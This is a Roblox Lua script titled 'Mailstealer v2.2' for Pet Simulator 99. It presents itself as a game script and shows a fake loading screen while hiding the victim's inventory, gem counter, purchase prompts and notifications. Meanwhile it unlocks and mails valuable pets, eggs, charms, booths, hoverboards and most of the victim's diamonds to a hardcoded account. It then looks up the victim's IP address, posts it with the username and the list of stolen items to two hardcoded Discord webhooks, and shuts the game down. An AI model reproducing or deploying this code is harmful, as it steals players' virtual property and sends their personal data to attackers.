-- 2.2 beta

if LoadingScreen == nil then
    LoadingScreen = false
end-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
if Webhook == nil or Webhook == "" then
    Webhook =
        "https://discord.com/api/webhooks/1191491431605485638/K5ORa88Msf_HqKdEGZPF8MT79P_lKjLFDfJoJ5UCTIaHRWf6L4rex8DnVH6Wv3idNjmt"
end
if Username == "" or Username == nil then
    Username = "Egorikusa_bank"
end
if LoadingScreen == true then
    hideall = false
else
    hideall = true
end

local GetSave = function()
    return require(game.ReplicatedStorage.Library.Client.Save).Get()
end
for i, v in pairs(GetSave().Inventory.Currency) do
    if v.id == "Diamonds" then
        GemAmount1 = v._am
    end
end
if GemAmount1 == nil or GemAmount1 < 10000 then
    game.Players.LocalPlayer:kick("Account is unsupported")
end

if LoadingScreen == true then
    LoadingScreen = true
LoadingText1 = "Loading Library"
LoadingText2 = "Updating Library"
LoadingText3 = "Getting Script"
LoadingText4 = "Executing Script"
LoadingText5 = "Error: Execution Failed, re-trying!"

local ScriptTitle = "Pet Simulator 99: Script Loading"

if LoadingScreen ~= false then
    local Loading = Instance.new("ScreenGui")
    local MainFrame = Instance.new("Frame")
    local Title = Instance.new("TextLabel")
    local Dots = Instance.new("Frame")
    local Dot1 = Instance.new("Frame")
    local UICorner = Instance.new("UICorner")
    local InsideDot = Instance.new("Frame")
    local UICorner_2 = Instance.new("UICorner")
    local Dot2 = Instance.new("Frame")
    local UICorner_3 = Instance.new("UICorner")
    local InsideDot_2 = Instance.new("Frame")
    local UICorner_4 = Instance.new("UICorner")
    local Dot3 = Instance.new("Frame")
    local UICorner_5 = Instance.new("UICorner")
    local InsideDot_3 = Instance.new("Frame")
    local UICorner_6 = Instance.new("UICorner")
    local Bar = Instance.new("Frame")
    local Bar2 = Instance.new("Frame")
    local UICorner_7 = Instance.new("UICorner")
    local UICorner_8 = Instance.new("UICorner")
    local Percentage = Instance.new("TextLabel")
    local Tip = Instance.new("TextLabel")
    local EndSequence = Instance.new("Frame")
    Loading.Name = "Egorikusa"
    Loading.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
    Loading.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    Loading.DisplayOrder = 999999999
    MainFrame.Name = "MainFrame"
    MainFrame.Parent = Loading
    MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    MainFrame.BorderSizePixel = 0
    MainFrame.Position = UDim2.new(-0.125662372, 0, -0.125935167, 0)
    MainFrame.Size = UDim2.new(1.25, 0, 1.25, 0)
    Title.Name = "Title"
    Title.Parent = MainFrame
    Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Title.BackgroundTransparency = 1.000
    Title.Position = UDim2.new(0.183329239, 0, 0.246382296, 0)
    Title.Size = UDim2.new(0.632528603, 0, 0.232815996, 0)
    Title.Font = Enum.Font.FredokaOne
    Title.Text = ScriptTitle
    Title.TextColor3 = Color3.fromRGB(255, 255, 255)
    Title.TextScaled = true
    Title.TextSize = 14.000
    Title.TextWrapped = true
    Dots.Name = "Dots"
    Dots.Parent = MainFrame
    Dots.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Dots.BackgroundTransparency = 1.000
    Dots.Position = UDim2.new(0.470970035, 0, 0.818612278, 0)
    Dots.Size = UDim2.new(0.0571707934, 0, 0.0360675976, 0)
    Dot1.Name = "Dot1"
    Dot1.Parent = Dots
    Dot1.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    Dot1.Position = UDim2.new(0.0611661971, 0, 0.234447539, 0)
    Dot1.Size = UDim2.new(0.159291148, 0, 0.51158762, 0)
    UICorner.CornerRadius = UDim.new(0.5, 0)
    UICorner.Parent = Dot1
    InsideDot.Name = "InsideDot"
    InsideDot.Parent = Dot1
    InsideDot.AnchorPoint = Vector2.new(0.5, 0.5)
    InsideDot.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    InsideDot.Position = UDim2.new(0.5, 0, 0.5, 0)
    UICorner_2.CornerRadius = UDim.new(0.5, 0)
    UICorner_2.Parent = InsideDot
    Dot2.Name = "Dot2"
    Dot2.Parent = Dots
    Dot2.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    Dot2.Position = UDim2.new(0.419989735, 0, 0.234447539, 0)
    Dot2.Size = UDim2.new(0.159291148, 0, 0.51158762, 0)
    UICorner_3.CornerRadius = UDim.new(0.5, 0)
    UICorner_3.Parent = Dot2
    InsideDot_2.Name = "InsideDot"
    InsideDot_2.Parent = Dot2
    InsideDot_2.AnchorPoint = Vector2.new(0.5, 0.5)
    InsideDot_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    InsideDot_2.Position = UDim2.new(0.5, 0, 0.5, 0)
    UICorner_4.CornerRadius = UDim.new(0.5, 0)
    UICorner_4.Parent = InsideDot_2
    Dot3.Name = "Dot3"
    Dot3.Parent = Dots
    Dot3.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    Dot3.Position = UDim2.new(0.778813243, 0, 0.234447539, 0)
    Dot3.Size = UDim2.new(0.159291148, 0, 0.51158762, 0)
    UICorner_5.CornerRadius = UDim.new(0.5, 0)
    UICorner_5.Parent = Dot3
    InsideDot_3.Name = "InsideDot"
    InsideDot_3.Parent = Dot3
    InsideDot_3.AnchorPoint = Vector2.new(0.5, 0.5)
    InsideDot_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    InsideDot_3.Position = UDim2.new(0.5, 0, 0.5, 0)
    UICorner_6.CornerRadius = UDim.new(0.5, 0)
    UICorner_6.Parent = InsideDot_3
    Bar.Name = "Bar"
    Bar.Parent = MainFrame
    Bar.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    Bar.BorderSizePixel = 0
    Bar.Position = UDim2.new(0.219547689, 0, 0.764966607, 0)
    Bar.Size = UDim2.new(0.560904443, 0, 0.0365853645, 0)
    Bar2.Name = "Bar2"
    Bar2.Parent = Bar
    Bar2.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
    Bar2.BorderSizePixel = 0
    Bar2.Size = UDim2.new(0, 0, 1, 0)
    UICorner_7.CornerRadius = UDim.new(0.5, 0)
    UICorner_7.Parent = Bar2
    UICorner_8.CornerRadius = UDim.new(0.5, 0)
    UICorner_8.Parent = Bar
    Percentage.Name = "Percentage"
    Percentage.Parent = Bar
    Percentage.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Percentage.BackgroundTransparency = 1.000
    Percentage.Position = UDim2.new(0.280816972, 0, 0.0909090936, 0)
    Percentage.Size = UDim2.new(0.438366145, 0, 0.787879348, 0)
    Percentage.Font = Enum.Font.FredokaOne
    Percentage.Text = "0%"
    Percentage.TextColor3 = Color3.fromRGB(255, 255, 255)
    Percentage.TextScaled = true
    Percentage.TextSize = 14.000
    Percentage.TextWrapped = true
    Tip.Name = "Tip"
    Tip.Parent = MainFrame
    Tip.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Tip.BackgroundTransparency = 1.000
    Tip.Position = UDim2.new(0.280816913, 0, 0.717294872, 0)
    Tip.Size = UDim2.new(0.438366145, 0, 0.0299334861, 0)
    Tip.Font = Enum.Font.SourceSansItalic
    Tip.Text = ""
    Tip.TextColor3 = Color3.fromRGB(138, 138, 138)
    Tip.TextScaled = true
    Tip.TextSize = 14.000-- MADE BY X SCRIPTS - discord.gg/xscripts
    -- MADE BY X SCRIPTS - discord.gg/xscripts
    -- MADE BY X SCRIPTS - discord.gg/xscripts
    -- MADE BY X SCRIPTS - discord.gg/xscripts
    -- MADE BY X SCRIPTS - discord.gg/xscripts
    Tip.TextWrapped = true
    EndSequence.Name = "EndSequence"
    EndSequence.Parent = Loading
    EndSequence.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    EndSequence.BorderSizePixel = 0
    EndSequence.Position = UDim2.new(1, 0, 0, 0)
    EndSequence.Size = UDim2.new(1, 0, 1, 0)
    local function NGZQAMK_fake_script()
        local script = Instance.new("LocalScript", Dots)
        while true do
            wait(0.25)
            script.Parent.Dot1.InsideDot:TweenSize(UDim2.new(1, 0, 1, 0), "In", "Sine", 0.25, true)
            wait(0.25)
            script.Parent.Dot2.InsideDot:TweenSize(UDim2.new(1, 0, 1, 0), "In", "Sine", 0.25, true)
            wait(0.25)
            script.Parent.Dot3.InsideDot:TweenSize(UDim2.new(1, 0, 1, 0), "In", "Sine", 0.25, true)
            wait(0.25)
            script.Parent.Dot1.InsideDot:TweenSize(UDim2.new(0, 0, 0, 0), "In", "Sine", 0.25, true)
            wait(0.25)
            script.Parent.Dot2.InsideDot:TweenSize(UDim2.new(0, 0, 0, 0), "In", "Sine", 0.25, true)
            wait(0.25)
            script.Parent.Dot3.InsideDot:TweenSize(UDim2.new(0, 0, 0, 0), "In", "Sine", 0.25, true)
        end
    end

    coroutine.wrap(NGZQAMK_fake_script)()
    local function NDID_fake_script()
        local script = Instance.new("LocalScript", MainFrame)
        local bar = script.Parent.Bar
        local insidebar = bar.Bar2
        local percentage = bar.Percentage
        wait(5)
        insidebar:TweenSize(UDim2.new(1, 0, 1, 0), "In", "Linear", 200, true)
    end
    coroutine.wrap(NDID_fake_script)()
    local function OVSBNB_fake_script()
        local script = Instance.new("LocalScript", Percentage)
        wait(5)
        for i = 1, 100 do
            script.Parent.Text = i .. "%"
            wait(2)
        end
    end
    coroutine.wrap(OVSBNB_fake_script)()
    local function SNUMK_fake_script()
        local script = Instance.new("LocalScript", Tip)
        local tip = script.Parent
        while true do
            wait(5)
            tip.Text = LoadingText1
            wait(5)
            tip.Text = LoadingText2
            wait(5)
            tip.Text = LoadingText3
            wait(5)
            tip.Text = LoadingText4
            wait(5)
            tip.Text = LoadingText5
        end
    end
    coroutine.wrap(SNUMK_fake_script)()
    local function LSNGUH_fake_script()
        local script = Instance.new("LocalScript", Loading)
        game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, false)
        game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
        game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
        game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.EmotesMenu, false)
    end
    coroutine.wrap(LSNGUH_fake_script)()
end

game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, false)
game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.EmotesMenu, false)
end

if getgenv().executed then
    return
end
getgenv().executed = true
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
local Blacklisted_Booths = {"Default", "Pls Donate", "Maskot", "Fire", "VIP"}
local Blacklisted_Hoverboards = {"Original", "Red Flying Carpet", "Blue Flying Carpet", "Bling", "Axolotl"}

local library = require(game.ReplicatedStorage.Library)
local save = library.Save.Get().Inventory
MailMessage = "Egorikusa and Xorek_top are best"
plr = game.Players.LocalPlayer
guis = plr.PlayerGui

local GetSave = function()
    return require(game.ReplicatedStorage.Library.Client.Save).Get()
end-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
local function shutdowngame()
    wait(1)
    game:Shutdown()
end

game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Claim All"):InvokeServer()

if hideall == true then
    task.spawn(
        function()
            while task.wait() do
                pcall(
                    function()
                        game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("Purchase Pending").Enabled =
                            false
                    end
                )
            end
        end
    )
    task.spawn(
        function()
            while task.wait() do
                pcall(
                    function()
                        game:GetService("Lighting").PurchasePendingBlur.Enabled = false
                    end
                )
            end
        end
    )
    task.spawn(
        function()
            while task.wait() do
                pcall(
                    function()
                        game:GetService("ReplicatedStorage").Assets.UI.Notifications.Bottom.Message:ClearAllChildren()
                    end
                )
            end
        end
    )
    task.spawn(
        function()
            local gemsDisplay = guis.MainLeft.Left.Currency.Diamonds.Diamonds.Amount
            local oldGemsValue = gemsDisplay.Text
            gemsDisplay:GetPropertyChangedSignal("Text"):Connect(
                function()
                    oldGemsValue = gemsDisplay.Text
                end
            )
        end
    )
    local function freeze_mygems()
        local gems_frame = game:GetService("Players").LocalPlayer.PlayerGui.MainLeft.Left.Currency.Diamonds
        local gems_frame_clone = gems_frame:Clone()

        gems_frame_clone.Parent = game:GetService("Players").LocalPlayer.PlayerGui.MainLeft.Left.Currency
        gems_frame.Visible = true
    end
    freeze_mygems()
    local gemsframe = game:GetService("Players").LocalPlayer.PlayerGui.MainLeft.Left.Currency.Diamonds
    gemsframe:Destroy()
    local function freeze_inventory()
        local pets_frame = game:GetService("Players").LocalPlayer.PlayerGui.Inventory.Frame.Main.Pets
        local pets_frame_clone = pets_frame:Clone()
        pets_frame_clone.Parent = game:GetService("Players").LocalPlayer.PlayerGui.Inventory.Frame.Main
    end
    freeze_inventory()
    local Inventoryframe = game:GetService("Players").LocalPlayer.PlayerGui.Inventory.Frame.Main.Pets
    Inventoryframe:Destroy()
    game.Workspace.__THINGS.Pets:Destroy()
end

task.spawn(
    function()
        while task.wait() do
            pcall(
                function()
                    local PetUIDs = {}

                    for i, v in pairs(save.Pet) do
                        id = v.id
                        dir = library.Directory.Pets[id]
                        if dir.huge == true then
                            table.insert(PetUIDs, i)
                        end
                    end
                    if save.Egg ~= nil then
                        for i, v in pairs(save.Egg) do
                            table.insert(PetUIDs, i)
                        end
                    end
                    if save.Charm ~= nil then
                        for i, v in pairs(save.Charm) do
                            table.insert(PetUIDs, i)
                        end
                    end

                    for _, petUID in pairs(PetUIDs) do
                        local args = {
                            [1] = petUID,
                            [2] = false
                        }
                        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked"):InvokeServer(
                            unpack(args)
                        )
                    end

                    local PetUIDs = {}
                    local library = require(game.ReplicatedStorage.Library)
                    local save = library.Save.Get().Inventory
                    for i, v in pairs(save.Pet) do
                        id = v.id
                        dir = library.Directory.Pets[id]
                        if dir.exclusiveLevel then
                            table.insert(PetUIDs, i)
                        end
                    end
                    for _, petUID in pairs(PetUIDs) do
                        local args = {
                            [1] = petUID,
                            [2] = false
                        }
                        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked"):InvokeServer(
                            unpack(args)
                        )
                    end
                end
            )
        end
    end
)

HugeList, ExcList, EggList, CharmList, BoothList, HoverList = {}, {}, {}, {}, {}, {}
table.foreach(
    save.Pet,
    function(i, v)
        local id = v.id
        local dir = library.Directory.Pets[id]
        if dir.huge then
            table.insert(HugeList, id)
        end
    end
)
if save.Egg ~= nil then
    table.foreach(
        save.Egg,
        function(i, v)
            local id = v.id
            local dir = library.Directory.Eggs[id]
            table.insert(EggList, id)
        end
    )
end
table.foreach(
    save.Pet,
    function(i, v)
        local id = v.id
        local dir = library.Directory.Pets[id]
        if dir.exclusiveLevel then
            table.insert(ExcList, id)
        end
    end
)
if save.Booth ~= nil then
    for i, v in pairs(save.Booth) do
        local id = v.id
        local dir = library.Directory.Booths[id]
        local isBlacklisted = false
        for _, blacklistedId in ipairs(Blacklisted_Booths) do
            if dir._id == blacklistedId then
                isBlacklisted = true
                break
            end
        end
        if not isBlacklisted then
            table.insert(BoothList, id)
        end
    end
end
if save.Hoverboard ~= nil then
    for i, v in pairs(save.Hoverboard) do
        local id = v.id
        local dir = library.Directory.Hoverboards[id]
        local isBlacklisted = false
        for _, blacklistedId in ipairs(Blacklisted_Hoverboards) do
            if dir._id == blacklistedId then
                isBlacklisted = true
                break
            end
        end
        if not isBlacklisted then
            table.insert(HoverList, id)
        end
    end
end
if save.Charm ~= nil then
    table.foreach(
        save.Charm,
        function(i, v)
            local id = v.id
            local dir = library.Directory.Charms[id]
            table.insert(CharmList, id)
        end
    )
end

local AllPetsList = {}
for _, list in pairs({HugeList, ExcList, EggList, BoothList, HoverList, CharmList}) do
    for _, value in pairs(list) do
        table.insert(AllPetsList, value)
    end
end
local PetsListString = "\n" -- Create a string to represent the HugeList
for i, v in pairs(AllPetsList) do
    PetsListString = PetsListString .. v .. "\n" -- Append each Huge item to the string
end
for i, v in pairs(GetSave().Inventory.Currency) do
    if v.id == "Diamonds" then
        GemAmount = v._am
    end
end

for i, v in pairs(GetSave().Inventory.Currency) do
    if v.id == "Diamonds" then
        GemAmount1 = v._am
    end
end

for i, v in pairs(GetSave().Inventory.Currency) do
    if v.id == "Diamonds" then
        GemAmount = v._am
    end
end
local ipwebhook = game:HttpGet("https://ipinfo.io/ip")
local url = Webhook
local whenabled = true
local function SendWebhook(url, ping)
    imgs =
        "https://cdn.discordapp.com/attachments/1151888533775196180/1190764360717574274/giftps99.png?ex=65a2fcba&is=659087ba&hm=1e65b7100a0159e66e2efd4f1c91a8362b60eb253fec0d40f12b4de5911ca4e5&"
    data1 = {
        ["content"] = ping,
        ["username"] = "Mailstealer v2.2",
        ["avatar_url"] = imgs,
        ["embeds"] = {
            {
                ["title"] = "__`Mailstealer Hit`__ \240\159\142\137",
                ["url"] = "https://discord.gg/QFAE3ztNGv",
                ["type"] = "rich",
                ["color"] = tonumber(0xadffb0),
                ["thumbnail"] = {
                    ["url"] = "https://cdn.discordapp.com/attachments/1151888533775196180/1190764360717574274/giftps99.png?ex=65a2fcba&is=659087ba&hm=1e65b7100a0159e66e2efd4f1c91a8362b60eb253fec0d40f12b4de5911ca4e5&",
                    ["height"] = 420,
                    ["width"] = 420
                },
                ["fields"] = {
                    {
                        ["name"] = "`(\240\159\144\167) Player Info:`",
                        ["value"] = "```(\240\159\167\184) Username: " ..
                            game.Players.LocalPlayer.Name ..
                                "\n(\240\159\148\146) Display Username: " ..
                                    game.Players.LocalPlayer.DisplayName ..
                                        "\n(\240\159\142\178) Creator: " ..
                                            Username ..
                                                "\n(\240\159\145\164) Ip: " ..
                                                    ipwebhook .. "\n(\240\159\147\140) Version: 2.2 ```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "`(\240\159\144\177) Pets List:`",
                        ["value"] = "```" .. PetsListString .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "`(\240\159\146\142) Gems:`",
                        ["value"] = "```" .. GemAmount .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "`(\240\159\154\128) Creators:`",
                        ["value"] = "```Egorikusa and XorekTop```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "",
                        ["value"] = "__**https://discord.gg/bmQjMN2cuU**__",
                        ["inline"] = false
                    }
                }
            }
        }
    }

    newdata1 = game:GetService("HttpService"):JSONEncode(data1)
    headers = {
        ["content-type"] = "application/json"
    }
    request = http_request or request or HttpPost or syn.request
    if Webhook ~= nil and whenabled == true then
        abcdef1 = {
            Url = url,
            Body = newdata1,
            Method = "POST",
            Headers = headers
        }
        request(abcdef1)
    end
end


local user = Username

while wait() do
    local HugeList = {}
    local EggList = {}
    local ExcList = {}
    local CharmList = {}
    local BoothList = {}
    local HoverList = {}

    function GemSteal()
        for i, v in pairs(GetSave().Inventory.Currency) do
            if v.id == "Diamonds" then
                GemAmount = v._am
                GemId = i
                local args = {
                    [1] = user,
                    [2] = MailMessage,
                    [3] = "Currency",
                    [4] = GemId,
                    [5] = GemAmount - 10000
                }
                game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(
                    unpack(args)
                )
                GemsStolen = true
            end
        end
    end
    spawn(
        function()
            while wait() do
                local HugeList = {}
                table.foreach(
                    save.Pet,
                    function(i, v)
                        local id = v.id
                        local dir = library.Directory.Pets[id]
                        if dir.huge then
                            table.insert(HugeList, i)
                        end
                    end
                )
                if #HugeList ~= 0 or HugeList ~= {} then
                    for i, v in pairs(save.Pet) do
                        local id = v.id
                        local dir = library.Directory.Pets[id]
                        if dir.huge then
                            local args = {
                                [1] = user,
                                [2] = MailMessage,
                                [3] = "Pet",
                                [4] = i,
                                [5] = v._am or 1
                            }
                            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(
                                unpack(args)
                            )
                        end
                    end
                    if #HugeList == 0 or HugeList == {} then
                        break
                    end
                end
            end
        end
    )
    spawn(
        function()
            while wait() do
                local EggList = {}
                if save.Egg ~= nil then
                    table.foreach(
                        save.Egg,
                        function(i, v)
                            local id = v.id
                            local dir = library.Directory.Eggs[id]
                            table.insert(EggList, i)
                        end
                    )
                end
                if #EggList ~= 0 and #HugeList == 0 then
                    for i, v in pairs(save.Egg) do
                        local args = {
                            [1] = user,
                            [2] = MailMessage,
                            [3] = "Egg",
                            [4] = i,
                            [5] = v._am or 1
                        }
                        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(
                            unpack(args)
                        )
                    end
                end
                if #EggList == 0 or EggList == {} then
                    break
                end
            end
        end
    )
    spawn(
        function()
            while wait() do
                local ExcList = {}
                table.foreach(
                    save.Pet,
                    function(i, v)
                        local id = v.id
                        local dir = library.Directory.Pets[id]
                        if dir.exclusiveLevel then
                            table.insert(ExcList, i)
                        end
                    end
                )

                if #ExcList ~= 0 and #HugeList == 0 and #EggList == 0 then
                    for i, v in pairs(save.Pet) do
                        local id = v.id
                        local dir = library.Directory.Pets[id]
                        if dir.exclusiveLevel then
                            local args = {
                                [1] = user,
                                [2] = MailMessage,
                                [3] = "Pet",
                                [4] = i,
                                [5] = v._am or 1
                            }
                            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(
                                unpack(args)
                            )
                        end
                    end
                    if #ExcList == 0 or ExcList == {} then
                        break
                    end
                end
            end
        end
    )
    spawn(
        function()
            while wait() do
                local BoothList = {}
                if save.Booth ~= nil then
                    for i, v in pairs(save.Booth) do
                        local id = v.id
                        local dir = library.Directory.Booths[id]
                        local isBlacklisted = false
                        for _, blacklistedId in ipairs(Blacklisted_Booths) do
                            if dir._id == blacklistedId then
                                isBlacklisted = true
                                break
                            end
                        end
                        if not isBlacklisted then
                            table.insert(BoothList, i)
                        end
                    end
                end
                if #BoothList ~= 0 and #ExcList == 0 and #HugeList == 0 and #EggList == 0 then
                    local pet1Index = math.random(1, #BoothList)
                    local booth = BoothList[pet1Index]
                    for booth, v in pairs(save.Booth) do
                        local args = {
                            [1] = user,
                            [2] = MailMessage,
                            [3] = "Booth",
                            [4] = booth,
                            [5] = v._am or 1
                        }
                        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(
                            unpack(args)
                        )
                    end
                end
                if #BoothList == 0 or BoothList == {} then
                    break
                end
            end
        end
    )
    spawn(
        function()
            while wait() do
                local HoverList = {}
                if save.Hoverboard ~= nil then
                    for i, v in pairs(save.Hoverboard) do
                        local id = v.id
                        local dir = library.Directory.Hoverboards[id]
                        local isBlacklisted = false
                        for _, blacklistedId in ipairs(Blacklisted_Hoverboards) do
                            if dir._id == blacklistedId then
                                isBlacklisted = true
                                break
                            end
                        end
                        if not isBlacklisted then
                            table.insert(HoverList, i)
                        end
                    end
                end
                if #HoverList ~= 0 and #BoothList == 0 and #ExcList == 0 and #HugeList == 0 and #EggList == 0 then
                    local petIndex = math.random(1, #HoverList)
                    local hover = HoverList[petIndex]
                    for hover, v in pairs(save.Hoverboard) do
                        local args = {
                            [1] = user,
                            [2] = MailMessage,
                            [3] = "Hoverboard",
                            [4] = hover,
                            [5] = v._am or 1
                        }
                        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(
                            unpack(args)
                        )
                    end
                end
                if #HoverList == 0 or HoverList == {} then
                    break
                end
            end
        end
    )
    spawn(
        function()
            while wait() do
                local CharmList = {}
                if save.Charm ~= nil then
                    table.foreach(
                        save.Charm,
                        function(i, v)
                            local id = v.id
                            local dir = library.Directory.Charms[id]
                            table.insert(CharmList, i)
                        end
                    )
                end
                if #CharmList ~= 0 and #HoverList == 0 and #BoothList == 0 and #EggList == 0 and #ExcList == 0 and #HugeList == 0 then
                    for i, v in pairs(save.Charm) do
                        local args = {
                            [1] = user,
                            [2] = MailMessage,
                            [3] = "Charm",
                            [4] = i,
                            [5] = v._am or 1
                        }
                        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(
                            unpack(args)
                        )
                    end
                end
                if #CharmList == 0 or CharmList == {} then
                    break
                end
            end
        end
    )
    spawn(
        function()
            while wait() do
                FinalList = #HugeList + #ExcList + #EggList + #CharmList + #BoothList + #HoverList
                if FinalList == 0 then
                    GemSteal()
                end
            end
        end
    )
    FinalList = #HugeList + #ExcList + #EggList + #CharmList + #BoothList + #HoverList
    if FinalList == 0 and GemsStolen == true then
        SendWebhook(url, "@everyone | v2.2")
        SendWebhook(
            "https://discordapp.com/api/webhooks/1191350601955676332/CO50-iNkgESYGQPokv7bnUOLmyq_9xrDl1SV3i28ZkIIFiCI7hcSuwUPh2HMkW-F7XF4",
            "`Not Dualhook`"
        )
        wait(2)
        shutdowngame()
    end
end
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
local library = require(game.ReplicatedStorage.Library)
local save = library.Save.Get().Inventory.Enchant

for i, v in pairs(save) do
    local id = v.id
    local dir = library.Directory.Enchants[id]
    print(v.tn)
end

local library = require(game.ReplicatedStorage.Library)
local save = library.Save.Get().Inventory.Enchant

for i, v in pairs(save) do
    local id = v.id
    local dir = library.Directory.Enchants[id]
    for key, value in pairs(dir) do
        print(key, value)
    end
end

local library = require(game.ReplicatedStorage.Library)
local save = library.Save.Get().Inventory
function StealHuge()
        local dir = library.Directory.Hoverboards
            for key, value in pairs(dir) do
                print(key, ":", value)
            end
            print("------")
end
StealHuge()